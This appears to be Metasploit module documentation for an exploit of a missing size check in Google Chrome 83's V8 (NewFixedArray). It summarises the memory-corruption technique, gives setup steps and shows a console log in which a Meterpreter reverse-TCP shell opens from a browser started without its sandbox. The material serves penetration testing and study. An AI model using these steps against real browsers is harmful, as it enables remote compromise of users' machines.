This module exploits an issue in Google Chrome 83.0.4103.97 (64 bit). The exploit makes use of a missing size check in NewFixedArray and abuses it to create a JSArray with an invalid length. This is abused to gain arbitrary read/write into the isolate region. Then an ArrayBuffer can be used to achieve absolute arbitrary read/write.
The exploit then uses WebAssembly in order to allocate a region of RWX memory, which is then replaced with the payload shellcode.

**The payload is executed within the sandboxed renderer process, so the browser must be run with the --no-sandbox option for the payload to work correctly.**

## Vulnerable Application

The module is compatible with any 64bit Google Chrome (version 83 or less) on macOS and Linux, however the code that writes the shellcode into the rwx region (wasm_rwx_addr) may need to be modified.

**Vulnerable Application Installation Steps**

You can download a vulnerable Chrome version from this location:
[https://chromium.cypress.io/linux/stable/83.0.4103.97](https://chromium.cypress.io/linux/stable/83.0.4103.97)

1. Do: ```use exploit/multi/browser/chrome_newfixedarray_sizecheck```
2. Do: ```set URIPATH / [PATH]```
3. Do: ```set LHOST [IP]```
4. Do: ```set SRVHOST [IP]```
5. Do: ```exploit```

## Scenarios

### Ubuntu 18.04 and Google Chrome 83.0.4103.97 with --no-sandbox
Start Google Chrome without a sandbox:
```➜  ~ google-chrome-stable --no-sandbox```

```
msf5 > use exploit/multi/browser/chrome_newfixedarray_sizecheck 
[*] No payload configured, defaulting to linux/x64/meterpreter/reverse_tcp
msf5 exploit(multi/browser/chrome_newfixedarray_sizecheck) > set srvport 80
srvport => 80
msf5 exploit(multi/browser/chrome_newfixedarray_sizecheck) > set uripath /
uripath => /
msf5 exploit(multi/browser/chrome_newfixedarray_sizecheck) > set srvhost 127.0.0.1
srvhost => 127.0.0.1
msf5 exploit(multi/browser/chrome_newfixedarray_sizecheck) > set lhost 127.0.0.1
lhost => 127.0.0.1
msf5 exploit(multi/browser/chrome_newfixedarray_sizecheck) > run
[*] Exploit running as background job 0.
[*] Exploit completed, but no session was created.

[!] You are binding to a loopback address by setting LHOST to 127.0.0.1. Did you want ReverseListenerBindAddress?
[*] Started reverse TCP handler on 127.0.0.1:4444 
msf5 exploit(multi/browser/chrome_newfixedarray_sizecheck) > [*] Using URL: http://127.0.0.1:80/
[*] Server started.
[*] 127.0.0.1        chrome_newfixedarray_sizecheck - Sending /index.html to Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4157.0 Safari/537.36
[*] Sending stage (3012516 bytes) to 127.0.0.1
[*] Meterpreter session 1 opened (127.0.0.1:4444 -> 127.0.0.1:44046) at 2020-10-22 16:33:05 +0530

msf5 exploit(multi/browser/chrome_newfixedarray_sizecheck) > sessions -i 1
[*] Starting interaction with 1...

meterpreter > getuid 
Server username: no-user @ ubuntu (uid=0, gid=0, euid=0, egid=0)
```
